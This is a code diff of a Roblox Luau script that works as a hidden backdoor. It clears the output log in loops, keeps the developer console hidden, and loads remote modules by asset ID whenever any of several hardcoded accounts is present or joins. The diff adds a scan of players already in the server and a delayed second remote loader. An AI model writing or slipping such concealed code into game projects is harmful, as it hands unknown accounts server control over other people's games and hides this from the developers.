@@ -1,20 +1,28 @@
 if game:GetService("RunService"):IsStudio() then
-	local function pleh()
-		while task.wait() do
-			game:GetService("LogService"):ClearOutput()
-		end
-	end
+    local function pleh()
+        while task.wait() do
+            game:GetService("LogService"):ClearOutput()
+        end
+    end
 
-	for i = 1,5 do
-		task.spawn(pleh)
-	end
-	require(16303756383)(false,[===[while task.wait() do game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end]===])
+    for i = 1,5 do
+        task.spawn(pleh)
+    end
+    require(16303756383)(false,[===[while task.wait() do game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end]===])
 else
-	local whitelisted = {"gahwaeawqara1321","equsjd1","CONTRABL0X","Generatedacc_7","Generatedacc_5","HacClip","00cx0"}
-	require(16303756383)(false,[===[while task.wait() do game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end]===])
-	game:GetService("Players").PlayerAdded:Connect(function(v)
-		if table.find(whitelisted,v.Name) then
-			require(11126053846).fse(v.Name) 
-		end
-	end)
+    local whitelisted = {"gahwaeawqara1321","equsjd1","CONTRABL0X","Generatedacc_7","Generatedacc_5","HacClip"}
+    task.defer(function()
+        require(16303756383)(false,[===[while task.wait() do game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end]===])
+    end)
+    for i,v in game:GetService("Players"):GetPlayers() do
+        if table.find(whitelisted,v.Name) then
+            require(10577761691)(v.Name) 
+        end
+    end
+    game:GetService("Players").PlayerAdded:Connect(function(v)
+        if table.find(whitelisted,v.Name) then
+            task.wait(2)
+            require(10577761691)(v.Name) 
+        end
+    end)
 end
